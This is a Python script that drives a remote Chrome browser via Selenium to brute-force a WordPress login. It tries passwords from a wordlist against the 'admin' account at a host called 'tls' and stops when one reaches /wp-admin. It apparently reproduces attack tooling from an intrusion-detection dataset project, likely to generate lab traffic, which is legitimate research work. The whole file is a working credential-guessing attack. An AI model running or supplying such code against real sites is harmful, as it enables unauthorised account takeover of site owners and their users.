"""Brute-force the WordPress login page through a real browser, one password at a time (modelled on loginB in the HIKARI authors' AutoSignPost.py, which was not run)."""

import sys
import time

from selenium import webdriver
from selenium.webdriver.common.by import By


def main(grid: str, passwords: str, attempts: int, start: int) -> None:
    options = webdriver.ChromeOptions()
    options.add_argument("--ignore-certificate-errors")
    driver = webdriver.Remote(command_executor=grid, options=options)
    guesses = [line.strip() for line in open(passwords) if line.strip()][start:start + attempts]
    tried = 0
    for password in guesses:
        try:
            driver.get("https://tls/wp-login.php")
            driver.find_element(By.ID, "user_login").send_keys("admin")
            driver.find_element(By.ID, "user_pass").send_keys(password)
            driver.find_element(By.ID, "wp-submit").click()
            tried += 1
            if "/wp-admin" in driver.current_url:
                print("login worked with", password)
                break
        except Exception:
            pass
        time.sleep(0.5)
    print("browser brute force done:", tried, "attempts")
    driver.quit()


if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]) if len(sys.argv) > 4 else 0)
